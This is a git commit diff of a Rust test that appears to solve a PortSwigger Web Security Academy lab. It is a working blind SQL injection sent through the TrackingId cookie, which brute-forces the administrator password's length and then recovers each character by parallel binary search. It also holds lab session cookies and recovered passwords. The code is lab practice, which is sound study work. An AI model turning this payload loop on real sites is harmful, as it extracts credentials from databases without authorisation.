0a4cb991b6ae3a35ccc0c23ee96d0f867139d7e1
genuinebasilnt <genuinebnt@gmail.com>
2025-04-29 19:33:34 +0530

    using message passing

--- src/portswigger/sql_brute.rs
+++ src/portswigger/sql_brute.rs
@@ -1,67 +1,85 @@
 #[cfg(test)]
 mod tests {
-    use std::{
-        collections::{BTreeMap, HashMap},
-        sync::{Arc, Mutex},
-    };
+    use std::sync::mpsc;
 
     use rayon::iter::{IntoParallelIterator, ParallelIterator};
     #[test]
     fn test_sql_brute() {
-        let lengths = (1..=20).into_iter().collect::<Vec<i32>>();
         let client = reqwest::blocking::Client::new();
-        let url = "https://0a2000170368f048881f715000d6000a.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories";
-        lengths.into_par_iter().for_each(|length| {
-            let payload = format!("' union select 'a' from users where username='administrator' and length(password)={} -- ", length);
-            let payload = urlencoding::encode(&payload).to_string();
-            let client = client.clone();
-            let request= client
+        let session_id = "kcKclKY99JaMi54bhUBKzikzfLsWfkhP".to_string();
+        let url = "https://0ada00a10404ba8d801bcb26002d0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories";
+
+        fn check(
+            payload: String,
+            session_id: String,
+            client: &reqwest::blocking::Client,
+            url: &str,
+        ) -> bool {
+            let encoded = urlencoding::encode(&payload);
+            let resp = client
                 .get(url)
                 .header(
                     "Cookie",
-                    format!(
-                        "TrackingId={}, session=IjHqZ5CJvozY6yw8wvMzomcTVlAHsPwc",
-                        payload
-                    ),
-                );
-            let response = request.send()
-                .expect(format!("Failed to send request for payload : {}", payload).as_str());
-            if response.text().unwrap().contains("<div>Welcome back!</div>") {
-                assert_eq!(20, length);
+                    format!("TrackingId={}, session={}", encoded, session_id),
+                )
+                .send()
+                .expect("Failed to send request")
+                .text()
+                .expect("Failed to read response");
+
+            resp.contains("<div>Welcome back!</div>")
+        }
+
+        let lengths: Vec<usize> = (1..=20).into_iter().collect();
+
+        let (sender, receiver) = mpsc::channel();
+
+        lengths.into_par_iter().for_each(|length| {
+            let client = client.clone();
+            let payload = format!("' union select 'a' from users where username='administrator' and length(password)={} -- ", length);
+            if check(payload, session_id.clone(), &client, url) {
+                sender.send(length).unwrap();
             }
         });
 
-        let chars = (31..=127)
-            .into_iter()
-            .map(|i| char::from_u32(i).unwrap())
-            .collect::<Vec<char>>();
-        let password: Arc<Mutex<BTreeMap<i32, char>>> = Arc::new(Mutex::new(BTreeMap::new()));
-        chars.into_iter().for_each(|char| {
-            let positions = (1..=20).into_iter().collect::<Vec<i32>>();
-            positions.into_par_iter().for_each(|pos| {
-                let payload = format!("' union select 'a' from users where username='administrator' and substring(password,{},1)='{}' -- ", pos, char);
-                let payload = urlencoding::encode(&payload).to_string();
-                let client = client.clone();
-                let request= client
-                    .get(url)
-                    .header(
-                        "Cookie",
-                        format!(
-                            "TrackingId={}, session=IjHqZ5CJvozY6yw8wvMzomcTVlAHsPwc",
-                            payload
-                        ),
-                    );
-                let response = request.send()
-                    .expect(format!("Failed to send request for payload : {}", payload).as_str());
-                if response.text().unwrap().contains("<div>Welcome back!</div>") {
-                   println!("Found char: {} at pos: {}", char, pos);
-                   password.lock().unwrap().insert(pos, char);
+        let length = receiver.recv().unwrap();
+        assert_eq!(length, 20);
+
+        let (sender, receiver) = std::sync::mpsc::channel();
+
+        (1..=length).into_par_iter().for_each(|pos| {
+            let mut left = 32;
+            let mut right = 126;
+
+            let client = client.clone();
+            let session_id = session_id.clone();
+
+            while left <= right {
+                let mid: u8 = left + (right - left) / 2;
+
+                let payload_greater = format!("' union select 'a' from users where username='administrator' and ascii(substring(password,{},1))>{} -- ", pos, mid);
+                let payload_curr = format!("' union select 'a' from users where username='administrator' and ascii(substring(password,{},1))={} -- ", pos, mid);
+
+                if check(payload_curr.clone(), session_id.clone(), &client, url) {
+                    sender.send((pos, mid as char)).unwrap();
+                    break;
+                } else if check(payload_greater.clone(), session_id.clone(), &client, url) {
+                    left = mid + 1
+                } else {
+                    if mid == 0 { break; }
+                    right = mid - 1;
                 }
-            });
+            }
         });
+
+        let mut password = vec!['0'; length];
+        for (pos, c) in receiver.iter().take(length) {
+            password[pos - 1] = c;
+        }
+
         assert_eq!(
-            *password.lock().unwrap().values().collect::<String>(),
-            "901iy93wtu4bcdtd0l29".to_string()
+            password.iter().collect::<String>(),
+            "uek7ez97glg8ba6g8eav".to_string()
         );
     }
 }
